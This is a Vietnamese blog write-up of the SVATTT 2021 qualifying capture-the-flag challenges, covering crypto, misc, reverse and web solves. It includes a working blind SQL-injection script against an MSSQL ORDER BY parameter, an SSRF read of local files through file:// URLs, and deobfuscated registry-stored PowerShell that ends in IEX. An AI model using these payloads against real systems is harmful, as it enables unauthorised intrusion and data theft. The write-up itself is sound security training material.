---
layout: post
title: WRITE-UP SVATTT-CTF-2021-QUALS
image: svattt-2021-quals/background.png
date: 2021-10-18 20:00:00 +0700
tags: [ctf, svattt, 2021, quals]
categories: ctf
---

| Challenge type                |
| ----------------------------- |
| * [WEB](#web)                   |
| * [MISC](#misc)               |
| * [CRYPTO](#crypto) |
| * [REVERSE](#reverse)           |

---  
  
# [Crypto](#crypto)  
  
## NoOne    

![Screenshot_1](https://user-images.githubusercontent.com/85006768/137721024-907eb5b8-f0c4-4958-b1d4-1e602010f819.jpg)
  
Link trên dẫn tới một trang đăng nhập, tiếp tục tạo thử một tài khoản và login.
![Screenshot_2](https://user-images.githubusercontent.com/85006768/137721104-afdf5be4-b891-4fff-8d80-5e071bc3f64c.jpg)
![Screenshot_3](https://user-images.githubusercontent.com/85006768/137721109-8d8f3e22-4cbe-4257-b83e-e211a346791e.jpg)
![Screenshot_4](https://user-images.githubusercontent.com/85006768/137721116-f0501631-cd3b-4617-987e-66ee1bfd813a.jpg)

Trong About có để [source](https://drive.google.com/file/d/1SeqO4Znt5E5QDqo0GWFlGBBjY2YSluCV/view?usp=sharing) và sau khi phân tích source mình sẽ rút ra được:

- User được chia làm hai loại, user thường và admin, trong đó `ROLE_ADMIN = 0; ROLE_USER = 1`. Để lấy được flag, mình phải là admin (request tới /flag).
- Ở login(), authtoken được tạo bằng `AES_CFB[len(usernamebytes).to_bytes(2, "little") + usernamebytes + role.to_bytes(1, "little")]`. Reference: [Wikipedia - Cipher feedback (CFB)](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_(CFB)).

![Screenshot_5](https://user-images.githubusercontent.com/85006768/137721239-5eed7318-38aa-4c34-bfa6-e9ba1a6d2be7.jpg)

- Như vậy, chỉ cần flip role từ 1 thành 0 là mình sẽ trở thành admin.

![Screenshot_6](https://user-images.githubusercontent.com/85006768/137721291-3daa2a1d-53b7-469f-8e7e-656d39daba94.jpg)
![Screenshot_7](https://user-images.githubusercontent.com/85006768/137721295-37f40175-7706-43e9-b1b1-4898c93e21e4.jpg)

> Flag: `ASCIS{z3r0_l0g0n_1s_H3re}`

***

## EasyOne
  
![Screenshot_1](https://user-images.githubusercontent.com/85006768/137721362-6ae1b303-9603-4fd3-ae7e-094495777e46.jpg)

Cũng tương tự như bài NoOne, tác giả cho [source](https://drive.google.com/file/d/1UNu49eEdaE_vjZ2urxysmJj5cmFbVyw1/view?usp=sharing) của challenge nằm ở /about.  

![Screenshot_2](https://user-images.githubusercontent.com/85006768/137721428-4e979207-7df1-45fd-9025-baf2a43f001c.jpg)
![Screenshot_3](https://user-images.githubusercontent.com/85006768/137721430-3bc5fe7a-a823-4a0a-b783-5d9b5a438bc6.jpg)
![Screenshot_4](https://user-images.githubusercontent.com/85006768/137721433-b9d3df52-da7f-4842-b98c-4835c12991ad.jpg)

Một điểm lưu ý, trong source code có một func dùng để login bằng certificate (/logincert), khi login theo cách này mặc định sẽ có role là admin.

![Screenshot_5](https://user-images.githubusercontent.com/85006768/137721453-30045753-4a8d-41a2-b749-5b4bc52fb3c3.jpg)
![Screenshot_8](https://user-images.githubusercontent.com/85006768/137721465-927bfb0e-2449-476f-acbc-fb013a9ea3ee.jpg)

Quay ngược lại phân tích validate_certificate() và verify_certificate_chain(), như vậy mình cần phải tạo một X.509 certificate (.pem), với `subject_cn == "admin"` và `issuer_cn == "ca"`.  
  
  
![Screenshot_6](https://user-images.githubusercontent.com/85006768/137721479-7acb5239-f6aa-4313-8aa9-acec28b19823.jpg)
![Screenshot_7](https://user-images.githubusercontent.com/85006768/137721484-c0c5cfcd-9a71-45d4-a8dd-90c34b5e0df0.jpg)

References: 
- [Wikipedia - Self-signed certificate](https://en.wikipedia.org/wiki/Self-signed_certificate)
- [Wikipedia - Certificate authority](https://en.wikipedia.org/wiki/Certificate_authority)
- [workaround.org - Create CA](https://workaround.org/certificate-authority/)

[sol.pem](EasyOne/sol.pem)
```
-----BEGIN CERTIFICATE-----
MIIDyjCCArKgAwIBAgIUdsrsPaMxa2TR/iSRJSCjg1hfIJAwDQYJKoZIhvcNAQEL
BQAwVDELMAkGA1UEBhMCVk4xCzAJBgNVBAgMAlZOMQswCQYDVQQKDAJjYTELMAkG
A1UECwwCY2ExCzAJBgNVBAMMAmNhMREwDwYJKoZIhvcNAQkBFgJjYTAeFw0yMTEw
MTYwNzUwMzFaFw0yMjEwMTYwNzUwMzFaMG0xCzAJBgNVBAYTAlZOMQswCQYDVQQI
DAJWTjELMAkGA1UEBwwCVk4xDjAMBgNVBAoMBWFkbWluMQ4wDAYDVQQLDAVhZG1p
bjEOMAwGA1UEAwwFYWRtaW4xFDASBgkqhkiG9w0BCQEWBWFkbWluMIIBIjANBgkq
hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw4bl8OUVKvhD5F+laZMF/7u9X0LS4Tb2
uSb5pSGkVmbYMNKzWZX7QLiPTF1OpGlzXLHKhxaVcTqrpkaqu3JqtylznKl6nFTA
KC6gBfLmNOmuPZ3X1+HYPdWgQN1H8mIRLrqu9KD9G5EEXEU+7UWmBgB9P9fczCGR
OfErffdmnqG0TDlD7Fk+oaWEHrGrMeOHBQcl5/Jso47nOqx2dPg8hXwW2I3gyeGD
DZRVZOk34wml8+awj6O+NdT/8Hs+YMNrVeGJbmhygZN9B34qH/C0IT7hIzImR2rc
4Nq5fVVwKxf3qOlW/eHhu6R0lqjTXmqtdMhh3BRkELcwr4V4iFc2mQIDAQABo3sw
eTAJBgNVHRMEAjAAMCwGCWCGSAGG+EIBDQQfFh1PcGVuU1NMIEdlbmVyYXRlZCBD
ZXJ0aWZpY2F0ZTAdBgNVHQ4EFgQUOkN+wHxnnVkZmXJl9iTXPHUSsygwHwYDVR0j
BBgwFoAUHtyzAugem8DTqS2AhZFr/4AOOFQwDQYJKoZIhvcNAQELBQADggEBAH+5
hZoyjXa20weLwrH/sYY+PUC0nQYVtGuz20ihJQdh9t+4meKjCSlOlD8dmOA/1Tph
gZ/sNEzSkxvt5WBHI7cCgtIB0CcsWQCKKxKJ5NQIYTydymepE4z+dYgkrAliAcMv
4Is48U84YFxljbCmVYKC4PXK5E66aqtgMEMV9lopC07+ybOs5L9EPo36mlqgrmVX
0vo0g3H506tBDviJRRMJ8UVEQaFWJxh6PbHBYpEpGwQPJRLrVla1iL4FsCn9wCWn
cv9uIOrhuHjof3lplMM0m9Jiv+cFPvYR+MWpWSfKyJVHqPoU5+J9+xeIIYrkzFzM
sSenSnMvDt6dPFj6Vl8=
-----END CERTIFICATE-----
```

Login bằng certificate thành công, vào lấy flag và submit thôi.


![Screenshot_9](https://user-images.githubusercontent.com/85006768/137721520-b55b0998-ae76-41a6-9d11-4f9ec3c364da.jpg)
![Screenshot_10](https://user-images.githubusercontent.com/85006768/137721532-e693ef01-38fc-4c0f-80c5-c59059b306a5.jpg)

> Flag: `ASCIS{c3rt_val1dat1on_s1mpl3}`  

# [Misc](#misc)
  
## PNG

Bước 1. Sử dụng `pngcheck` kiểm tra ảnh và biết ảnh đang bị lỗi các byte CRC

```
vcs.png  CRC error in chunk IHDR (computed 3d4d4a61, expected b018483d)
ERROR: vcs.png
```

Dùng trình chỉnh mã hex bất kì, chỉnh lại giá trị CRC `3d4d4a61` thành `b018483d`.

Bước 2. Cờ được giấu ở phía cuối ảnh, có thể sử dụng [fotoforensic](https://fotoforensics.com/) để xem các hidden pixel và lấy được cờ.

Ngoài ra giải thích thêm hidden pixel có là vì chiều cao ảnh bị chỉnh khác lại so với ảnh gốc, làm mất đi phần nội dung cuối góc ảnh. Bạn có thể tham khảo [PNG (Portable Network Graphics) Specification](https://www.w3.org/TR/PNG-Chunks.html) tính toán vị trí hex code của chiều cao và chiều rộng và thay đổi trực tiếp.  
  
## travel paper
![image](https://user-images.githubusercontent.com/41907864/137715825-2d3a6567-f575-4fa4-993f-0ee0d1f078d8.png)

Sau khi kết nối `nc` thì nhận được `QR code` được vẽ ra bằng các kí tự đặc biệt trên console như sau:
![image](https://user-images.githubusercontent.com/41907864/137716035-f04fb83b-6671-4733-b4cc-8b8fe00bb591.png)

Sau khi thử decode `QR code` này bằng cơm thì thu được kết quả có dạng như sau: `682584872|Nguyen Tuan Thanh|14/11/2021`. Ta dễ dàng có thể đoán được dữ liệu tương ứng là:

- `ID Number`: 682584872
- `Full Name`: Nguyen Tuan Thanh
- `Expired Date`: 14/11/2021

Sau khi mình submit thông tin lên thì tiếp tục nhận được 1 `QR code` khác.... hmmm vậy là mình quyết định sẽ code 1 script tự động nhận dữ liệu, decode `QR code` và gửi thông tin decode được lên server.

Ý tưởng của mình là sẽ phải convert được dạng QR code bằng kí tự đặc biệt kia về các pixel tương ứng với 0 và 1, sau đó sử dụng thư viện `QR code decode` để lấy data và gửi lên server.

Sau khi mở các kí tự đặc biệt tạo `QR code` bằng sublime text mình nhận ra có 3 loại kí tự đặc biệt: █  ▄  ▀
Mình nhận thấy mỗi kí tự này sẽ chiếm 2 dòng pixel (nếu coi QR code là 1 hình). Công việc bây giờ đơn giản là sẽ map 3 kí tự này tương ứng với data trong matrix như sau:

  █ =>  `1
             1`

  ▄ =>  `0
             1`

  ▀ =>  `1
            0`

Sau khi tạo ra được matrix pixel để tạo hình tương ứng thì mình vẫn chưa decode bằng thư viện `pyzbar` được nên mình đã thử resize hình lên `300x300` và đã decode được, cuối cùng là viết script tự động như dưới đây:

```python3
from pwn import *
from PIL import Image
import numpy as np
from pyzbar import pyzbar

r = remote('125.235.240.166', 20123)
for round_index in range(1, 101):
    print(r.recvuntil(f'Person #{round_index}:\n'))
    qr_content = r.recvuntil('ID Number: ').strip(b'\nID Number: ')
    print(qr_content.decode())
    qr_content = qr_content.replace(bytes(qr_content[:2]), b' ')

    list_line = qr_content.split(b'\n')
    list_line = list_line[2:-2]

    matrix = []
    index = 0
    for line in list_line:
        line = line[4:-4].replace(b' ', b'\x00\x00\x00')
        matrix.append([0] * (len(line) // 3))
        matrix.append([0] * (len(line) // 3))
        for i in range((len(line) // 3)):
            if line[3*i:3*i+3] == b'\x00\x00\x00':
                matrix[index][i] = 0
                matrix[index+1][i] = 0
            elif line[3*i:3*i+3] == b'\xe2\x96\x88':
                matrix[index][i] = 1
                matrix[index+1][i] = 1
            elif line[3*i:3*i+3] == b'\xe2\x96\x80':
                matrix[index][i] = 1
                matrix[index+1][i] = 0
            elif line[3*i:3*i+3] == b'\xe2\x96\x84':
                matrix[index][i] = 0
                matrix[index+1][i] = 1
            else:
                matrix[index][i] = -1
                matrix[index+1][i] = -1
            
        index += 2

    pixels = []
    for i in range(len(matrix)):
        line = matrix[i]
        pixels.append([0] * len(line))
        for j in range(len(line)):
            data = line[j]
            if data == 0:
                pixels[i][j] = (255, 255, 255)
            else:
                pixels[i][j] = (0, 0, 0)
    # print(pixels)

    # Convert the pixels into an array using numpy
    array = np.array(pixels, dtype=np.uint8)
    # Use PIL to create an image from the new array of pixels
    new_image = Image.fromarray(array)
    new_image = new_image.resize((300,300))
    # new_image.save('new.png')

    # print(image)
    barcodes = pyzbar.decode(new_image)
    for barcode in barcodes:
        qrcode_data = barcode.data
        r.sendline(qrcode_data.split(b'|')[0].strip())
        print(r.recvuntil('Full Name:'))
        r.sendline(qrcode_data.split(b'|')[1].strip())
        print(r.recvuntil('Expired Date:'))
        r.sendline(qrcode_data.split(b'|')[2].strip())
        print(r.recvuntil('Correct!\n'))
        break
r.interactive()
```

> Flag: ASCIS{c0r0n4_v1rus_1s_g0n3} 
  
## Sherlock Homes

Nhận được tệp có phần mở rộng tập tin là VHDX.

![image](https://user-images.githubusercontent.com/32236617/137692521-b9a34505-7adb-4248-8ef2-06276c17dec0.png)

Phần mở rộng của tệp tin là [VHDX](https://www.techopedia.com/definition/29319/hyper-v-virtual-hard-disk-vhdx) là định dạng tệp ảnh đĩa được xem như là một ổ cứng thực,vật lý nhưng được lưu trữ trong một tệp duy nhất nằm *trên* một đĩa vật lý giống như một ổ đĩa cứng.

Có một số cách để phân tích tệp này như sử dụng [autopsy](https://www.autopsy.com/) hoặc [mount](https://askubuntu.com/questions/1088411/mount-vdhx-image-on-ubuntu-data-recovery) trực tiếp ổ này vào máy tính rồi dùng cách cú pháp dòng lệnh để phân tích. Mình sẽ gợi ý theo cách [mount](https://askubuntu.com/questions/1088411/mount-vdhx-image-on-ubuntu-data-recovery) trực tiếp, sau khi làm theo hướng dẫn trong đường dẫn đính kèm thì giờ có thể trực tiếp truy xuất các dữ liệu trong ổ đĩa.

Thông thường thì bước đầu cứ `grep -rn "flag"` hoặc `grep -rn "ascis{"` xem thử có gì liên quan không.

![image](https://user-images.githubusercontent.com/32236617/137688238-88a7de28-4467-4295-97e8-464c7c5ffed1.png)

Trường hợp không có thì hãy thử truy vết các tệp được tạo, chỉnh sửa gần đây bằng lệnh `find` .

Với lệnh trên thì tìm ra vài thông tin khả nghi như

```
C:\Users\John\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
D:\Setup\Log\C\Users\John\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C/Users/John/AppData/Local/ConnectedDevicesPlatform/L.John/ActivitiesCache.db
```

Đọc tệp `C/Users/John/AppData/Local/ConnectedDevicesPlatform/L.John/ActivitiesCache.db` thì có các nội dung như sau:

![image](https://user-images.githubusercontent.com/32236617/137689766-b070535e-cbd9-4ed6-9c40-87e83bcaa244.png)

Có chứa `ASCIS{NTF$_!S_G00D}` đúng với định dạng của cờ, sau khi submit thì nhận được thông báo cờ sai. Có trao đổi với phía BTC thì nhận được thông tin là cờ giả. Tiếp tục đào các dữ kiện khác.

Sử dụng [lnkinfo](https://www.howtoinstall.me/ubuntu/18-04/liblnk-utils/) xem thông tin tệp này [lnk](https://help.dropbox.com/installs-integrations/desktop/lnk-files#:~:text=lnk%20are%20Windows%20shortcut%20files,in%20order%20to%20sync%20them.).

![image](https://user-images.githubusercontent.com/32236617/137688915-09acf435-b89b-45a0-8f63-2500b83118cd.png)

Xác định đường tệp gốc flag nằm ở đường dẫn `D:\Work\CONFIDENTAL\ProjectX\2021\SECRET\flag.txt`. Nhưng vấn là ổ đĩa D không có trông tệp đĩa hình ảnh ban đầu. Vì trong cờ giả có từ khóa `NTFS` nên mình nghĩ có thể sử dụng [mtfparse](https://github.com/EricZimmerman/MFT) để xem các giá trị offset của tệp flag.txt trên `RAM`, làm các phép tính toán với [ntfs-partition-boot-sector](http://ntfs.com/ntfs-partition-boot-sector.htm) rồi trace trực tiếp nhưng có vẻ không khả thi.

Mình có lục lọi các tệp khác trên hệ thống, mong rằng sẽ tìm được gì khác như bản backup nào đó. Đã xem qua các log internet, user.dat, nhưng không tìm thấy gì khả nghi. Nhưng **suýt** quên mất rằng chúng ta có ổ C, là ổ chứa các tệp nhật kí hệ thống, trong đó có cả event log. Cho dù không có ổ D, nhưng ta vẫn có thể truy vết được các thao tác của tác giả trên hệ thống trước khi thực hiện ghi lại hình ảnh ổ đĩa. Và mong rằng nó có chứa cờ!

Tìm hiểu thì `%SystemRoot%\System32\Winevt\Logs ` sẽ là nơi chứa các tệp lưu lại các nhật kí thao các của người dùng với các ứng dụng, hệ điều hành,.... Dễ hình dung hơn thì nó là các tệp log trên event viewer hay coi. Và có lẽ các thao tác của tác giả khi tương tác với tệp `flag.txt` cũng nằm trên này. Việc bây giờ là cần xem qua các tệp này, vì cờ có thể ở bất kì bản nhật kí người dùng nào. 

![image](https://user-images.githubusercontent.com/32236617/137704675-6cc875c7-a4eb-48e7-98f1-484fdd6b3c8b.png)

Mất khá nhiều thời gian để tìm đến được tệp [Microsoft-Windows-Sysmon%4Operational.evtx](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon), tệp này là bản ghi lưu lại nhật kí các thao tác dịch vụ hệ thống windows và trình điều khiển thiết bị, sau khi được cài đặt trên hệ thống.

Sử dụng event viewer trên windows hoặc [filext.com/file-extension/EVTX](https://filext.com/file-extension/EVTX) để xem online.

Khuyến mãi: https://www.sans.org/blog/parsing-sysmon-events-for-ir-indicators/

![image](https://user-images.githubusercontent.com/32236617/137701540-f1609ce1-90a6-4e0d-b0e1-3f8c87e10c4a.png)

![image](https://user-images.githubusercontent.com/32236617/137701000-583f6f8b-b392-46cd-a061-8ccc030fb148.png)   
  
# [Reverse](#reverse)  

## FSM

> Binary: [fsm_B6CB40CE8F1E1C0B71B376A259F42C8F.exe](https://drive.google.com/file/d/1HKuM3NNG7oUzKONznmnob6xD6r-piakw) (PE x64)

Yêu cầu thử thách này là cần nhập 3 giá trị hex theo đúng định dạng để làm key. Các  giá trị vừa nhập đó sẽ được đưa vào 1 loạt thuật toán xor để tạo ra 2 giá trị cuối cùng tạm gọi ở đây là *checksum1* và *checksum2*.  
  
![1](https://user-images.githubusercontent.com/85006768/137727254-b70a7239-6238-4ff4-9b24-53fcfa795468.png)    
  
Tiếp tục chương trình tạo thread để kiểm tra 2 giá trị *checksum1* và *checksum2*.  
![2](https://user-images.githubusercontent.com/85006768/137727343-8f4705a0-130f-4ec4-80fe-c4866c181203.png)  

Tại luồng xử lý của thread kiểm tra 3 điều kiện.  
![3](https://user-images.githubusercontent.com/85006768/137727415-550e7a63-baf3-4432-b658-1cd1faa2a697.png)  
  
Vậy thì có 3 điều kiện cho ba giá trị cần tìm. Dùng z3solver để giải bài này:

```python
from z3 import *

s = Solver()
part1 = BitVec('part1', 32)
part2 = BitVec('part2', 32)
part3 = BitVec('part3', 32)


s.add(1620 * part2 + 5447 * part3 + 17170 * part1 == 0x52D012C ^ 0x2ED0F8B0)
s.add(9543 * part3 + 19218 * part1 + 27870 * part2 == 0x323030B5 ^ 0x63987AEB)
s.add(7287 * part3 + 11210 * part1 + 24874 * part2 == 0x8A0B76BC ^ 0xB6DDCFF6)

print(s.check())
m = s.model()
flag = []
md = sorted([(d, m[d]) for d in m], key = lambda x: str(x[0]))
for i in md:
  flag.append(i[1].as_long())

for i in flag:
  print(hex(i)[2:],end = '-')
```

Kết quả nhận được key và flag như sau:

``` tiddlywiki
key : 4ab6-2c6d-11894
Flag: ASCIS{I Know Kung-Fu!}
```  
> Flag: `ASCIS{I Know Kung-Fu!}`

## Trace me  
  
> Binary: [buf.so](https://drive.google.com/file/d/1DA8altVbeu7DpodTGF_He9ga6xq87tXi) (ELF x86)

Thực thi chương trình nhận được yêu cầu nhập mật khẩu. Sau đó,  hiển thị thông báo như sau:  
![4](https://user-images.githubusercontent.com/85006768/137727573-729e9dd8-4d0e-48b3-a7bf-bd7ccd92ad31.png)
  
Phân tích code bài này với IDA tại hàm main. Nhận thấy đoạn code kiểm tra chuỗi nhập vào.   
  
![5](https://user-images.githubusercontent.com/85006768/137727654-ad5b8bed-3db5-4634-a184-f418f45b432c.png)
  
Đi thử thực thi chương trình với chuỗi này và kết quả thất bại.
  
![6](https://user-images.githubusercontent.com/85006768/137727732-abb45d74-61b8-4da2-be3f-859c9ce10b48.png)  
  
Với tên bài là trace me và luồng thực thi như này thì khả năng tác giả giấu đoạn code chính ở hàm init và sử dụng kỹ thuật ptrace giao tiếp giữa 2 tiến trình. Một thử thách tương tự ở giải `flareon7 (chall 10)` cũng  có ý tưởng tương tự.

Đúng như dự đoán hàm init gọi đến nơi tạo và giao tiếp với tiến trình con để thay đổi data.
![7](https://user-images.githubusercontent.com/85006768/137727795-75c28518-413d-4037-a75f-5f177e5d101b.png)  
    
![8](https://user-images.githubusercontent.com/85006768/137727883-ddbfdd45-6fe4-4689-b01a-8a25e5ce1e63.png)  
  
Debug thì phát hiện được hàm sub_14C6 sẽ đọc data tại các địa chỉ trong hàm sub_1B7E của tiến trình con và decode bằng thuật toán xor.   
  
![9](https://user-images.githubusercontent.com/85006768/137727970-19d2f844-dcc1-4070-bc06-f7fd84ec525c.png)  
  
Hàm sub_1B7E sử dụng thuật toán RC4 để mã hóa chuỗi nhập vào và so sánh với cipher. Key trong hàm này sẽ được tiến trình cha decode rồi tiến trình con bắt đầu dùng key đó decrypt.  
  
![10](https://user-images.githubusercontent.com/85006768/137728063-80f136a7-c088-4496-97d2-0e51833c25cd.png)  
  
Sau khi Xor ta có được key như sau:   
  
![11](https://user-images.githubusercontent.com/85006768/137739111-550308fd-004d-413a-851a-232bb736d476.png)

Decrypt:

```
cipher = b"\xa9\xa5\xe4\x0e{\xb1Q;'\x01\xc6\xa0C\xb3\x0c\xbe\xa5%\xaa\xf7\x95\xbb6\xc4\xe8\x1e\x1c\xd5SV\xd3\xcaF\x9a\xb8$\xbd\x00"
key = 'ASCIS2021'
```  
  
![12](https://user-images.githubusercontent.com/85006768/137729125-87f48920-e2f7-4eb9-b0c6-5f9be53059aa.png)

## ghost reg
![image](https://user-images.githubusercontent.com/41907864/137721257-a2ea4b23-be8f-4186-aac1-5b6d468db52e.png)

Sau khi phân tích 3 file `HKCR.reg`, `HKCU.reg`, `HKCM.reg` thì tìm được 2 đoạn có vẻ thú vị

![image](https://user-images.githubusercontent.com/41907864/137721412-c0aa09f8-5905-4f0f-a1fd-faf102fdd12c.png)

Sử dụng công cụ `deobshell` (https://github.com/thewhiteninja/deobshell) kết hợp với deobfuscate bằng "cơm" thì cuối cùng thu được 2 đoạn mã powershell như sau:

part1:
```powershell
if(($abcd -split ' ')[-1] -eq "$env:appdata\flag.svattt" -and (Get-FileHash ($abcd -split ' ')[-1] -Algorithm MD5).hash -eq "CF5A6ED30AE66ECF61C1286516F8A943" -and (gc $env:appdata\plmjuh)[-1..-5] -join "" -eq "SCISA"){
    $11 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\svattt\shell\open\command" -name "aocnsit")."aocnsit";
    $111 = [System.Convert]::FromBase64String($11);
    $1111 = gc ($abcd -split ' ')[-1] -encoding byte; 
    $11111 = New-Object Byte[] $111.count;
    for($i=0; $i -lt $111.count ; $i++) { 
        $11111[$i] = $111[$i] -bxor $1111[$i];
    }
    sc ($abcd -split ' ')[-1] -value $11111 -encoding byte;
};
$abcd | IEX;
```
part2:
```powershell
$abcd.split(' ')[-1].split('.')[-1]

if(test-path $env:appdata\plmjuh -PathType Leaf) {
    $1 = (gc $env:appdata\plmjuh)[-1..-5]
}else{
    ni -path $env:appdata\plmjuh -ItemType "file"
}
$11 = $abcd.split(' ')[-1].split('.')[-1]
ac $env:appdata\plmjuh -value $11

if(-not (test-path "$env:appdata\flag.svattt" -PathType Leaf)) {
    ni -path "$env:appdata\flag.svattt" -ItemType "file"
}

if($11 -eq "a"){
    $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "jRSgo")."jRSgo";
    ac $env:appdata\flag.svattt -value ([System.Convert]::FromBase64String($111)) -encoding byte;
}else{
    switch ($1[0]){
        "a"{
            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "WycrJ")."WycrJ";   
        }
        "s"{
            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "2NoQX")."2NoQX";
        }
        "i"{
            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "JdMTE")."JdMTE";
        }
        "c"{
            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "1K1tj")."1K1tj";
        }
    }
    ac $env:appdata\flag.svattt -value ([System.Convert]::FromBase64String($111)) -encoding byte;
}

$1111 = "Hey $((gc $env:appdata\plmjuh)[-5..-1]), can you find me?"

$11111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "aEFyX")."aEFyX"

sc $abcd.split(' ')[-1] -value ([System.Convert]::FromBase64String($11111)) -encoding Byte

ac $abcd.split(' ')[-1] -value "Hey $((gc $env:appdata\plmjuh)[-5..-1] -join ''), can you find me?"

$abcd | IEX
```

Tiếp tục debug 2 đoạn powershell này bằng công cụ `Powershell Tools for Visual Studio`

![image](https://user-images.githubusercontent.com/41907864/137722084-2d10bd98-2819-4051-bd91-7a33d1be560b.png)

Để ý kĩ thì đoạn powershell này sẽ kiểm tra điều kiện và switch case để quyết định lấy dữ liệu từ registry nào để `Base64 decode` và cuối cùng là append vào file `flag.svattt`.
```powershell
if($11 -eq "a"){
    $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "jRSgo")."jRSgo";
    ac $env:appdata\flag.svattt -value ([System.Convert]::FromBase64String($111)) -encoding byte;
}else{
    switch ($1[0]){
        "a"{
            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "WycrJ")."WycrJ";   
        }
        "s"{
            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "2NoQX")."2NoQX";
        }
        "i"{
            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "JdMTE")."JdMTE";
        }
        "c"{
            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "1K1tj")."1K1tj";
        }
    }
    ac $env:appdata\flag.svattt -value ([System.Convert]::FromBase64String($111)) -encoding byte;
}
```

Lại để ý ở `part1`, md5 của file `flag.svattt` phải trùng với `CF5A6ED30AE66ECF61C1286516F8A943`. Vì mình không biết được thứ tự append các content vào file `flag.svattt` nên mình quyết định sẽ viết 1 script để brute thứ tự.

```python
from hashlib import md5
from base64 import b64decode
from itertools import permutations

list_content = []
list_content.append("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLnNhYWFuWVlUWW5hYWFjLiAgICAgICAgICAgI...")
list_content.append("/9j/4AAQSkZJRgABAQEA8ADwAAD/4SdARXhpZgAATU0AKgAAAAgACwEPAAIAAAAGAAAAkgEQAAIAA...")
list_content.append("/wCsl2455FOfS7QSljNJ6jGOKxWsJsj93J82Tgg06SwujJt8uYbuOlP2f98j2lTsjXFhZqzDzpcYz...")
list_content.append("3b/s/wCc1Yg+IOq7l/0peByAOnf8aJSxn938SKccJLVwl96/yLsnhG+i8GeIt1vIudHvV6DGTbyD/...")
list_content.append("VsPRpVn70U7+rtq10elvRI/lXMMuwFHG1K+Eu76eStKWkXu1y8rb7trpo6RAVCGSM56fN7VH5beXy...")
list_content.append("r9Yv+C1Xh7zvD/w/1FV/1dzdWpbHTdGGH/oNfkN+014TvW8bx3GnX09rewyl7ZI3Mm8tsLlv7q7ZP...")

for contents in permutations(list_content, 5):
    temp = ''
    for content in contents:
        temp += b64decode(content)
    if md5(temp).hexdigest().upper()== 'CF5A6ED30AE66ECF61C1286516F8A943':
        open('flag.svattt', 'wb').write(temp)
        print 'found'
        break
```
Ở `part1`, sau khi thỏa mấy điều kiện ở trên sẽ đọc giá trị của `aocnsit` trong registry sau đó thực hiện vòng lặp để  `xor` với file `flag.svattt`.

```python
from base64 import b64decode

b = open('flag.svattt', 'rb').read()
a = b64decode...")

r = ''
for i in range(len(a)):
    r += chr(ord(a[i]) ^ ord(b[i % len(b)]))

open('flag.png', 'wb').write(r)
``` 
Kết quả thu được 1 cái hình như này

![final](https://user-images.githubusercontent.com/41907864/137724646-ca8e73dd-8edd-4436-ad87-08e6e02bfd53.png)

Sau khi giải ra bài này, mình đã căng mắt ra để submit flag nhưng mà vẫn bị sai, đội mình quyết định hỏi BTC thì sau đó BTC đã sửa lại flag trên web ctfd.

> Flag: ASCIS{H1!_1_4m_p0w3r_Gh057}

# [Web](#web)   

## script kiddie - 100pts  
  
Như mô tả ta có thể biết rằng web có chứa lỗ hổng SQL-injection với cơ sở dữ liệu được dùng ở đây là MSSQL.  
Câu query như sau: ` SELECT * FROM ... ORDER BY $sort ASC`  
Giá trị của biến `$sort` ta có thể control thông qua param `?sort=`  
Payload: `(case when (ascii(substring(db_name(),{index},1))={ord(c)}) then 1 else 1/db_name() end )`  
  
```python3  
import requests
from string import printable


url = 'http://167.172.85.253/web100/'
r = requests.Session()
db = ''
index = len(db) + 1

while True:
	for c in printable:
		#print("testing for " + c)
		payload = f'(case when (ascii(substring(db_name(),{index},1))={ord(c)}) then 1 else 1/db_name() end)'
		resp = r.get(url + '?sort=' + payload)
		if "Error" not in resp.text:
			db += c
			index += 1
			print(f"Length: {len(db)} - DB_NAME: {db}")
			break  
```  
![image](https://user-images.githubusercontent.com/44127534/137701975-53123d34-8aa2-4aa5-a045-d4bb27ac934d.png)  
> Flag: `ASICS{ssalchtiwesmihcueymorf}`  

## OProxy - 400pts
  
Challege là một trang web có chức năng cho người dùng nhập vào một url và server trả về nội dung của trang web đó.  
![1](https://user-images.githubusercontent.com/44127534/137702153-809ef500-a4e6-49fa-b83e-4df111c5c777.png)
  
Dự đoán đây có thể tác giả ra thử thách ssrf. Fuzz các payload ssrf thì thấy được:  
![2](https://user-images.githubusercontent.com/44127534/137702202-a82f0e56-e27d-4629-a829-de987f526274.png)
  
Để ý server respose header Werkzeug/1.01 Python/3.10.0, có thể dự đoán được back-end có thể là flask, và có thể challenge được dựng trên docker, thử nhập url: file://127.0.0.1/app/main.py thì có được mã nguồn:  
  
![3](https://user-images.githubusercontent.com/44127534/137702301-c120d7c0-0606-44ab-8ab1-590538b0dd33.png)
  
Tới đây thì thử đọc file flag:  
![4](https://user-images.githubusercontent.com/44127534/137702338-414b7486-4fa5-4cf3-8864-4121a2d92ccc.png)
  
> Flag: `ASCIS{SSRF_M3mcached_inj3cti0n}`  

## isolate - 475 pts  
  
fixingg...

